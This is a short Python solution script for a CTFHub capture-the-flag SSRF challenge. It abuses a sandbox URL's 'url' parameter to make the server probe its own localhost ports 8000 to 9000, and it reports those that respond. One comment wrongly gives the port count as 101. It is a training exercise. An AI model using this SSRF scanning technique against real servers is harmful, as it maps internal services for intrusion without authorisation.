# CTFHub SSRF 端口扫描：扫 127.0.0.1 的 8000~9000 端口，找开着的那个
import sys
import requests

URL = "http://challenge-3824050af7e811ec.sandbox.ctfhub.com:10800/"
S = requests.Session()

print("[*] 开始扫描 127.0.0.1:8000 ~ 9000 ...")

for port in range(8000, 9001):
    try:
        # 通过 SSRF 让服务器去访问自己的某个端口
        r = S.get(URL, params={"url": "http://127.0.0.1:%d" % port}, timeout=8)
        body = r.text.strip()
        # 有内容的端口才打印（空白的多半是端口没开）
        if body:
            print("[+] 端口 %d 有响应: %s" % (port, body[:200]))
            sys.stdout.flush()
    except Exception:
        # 连接失败/超时 = 端口没开，跳过
        pass

    # 每扫 200 个打个进度（这里总共就 101 个，扫完自动停）
    if port % 200 == 0:
        print("[*] 正在扫 %d ..." % port)
        sys.stdout.flush()

print("[*] 扫描完成")
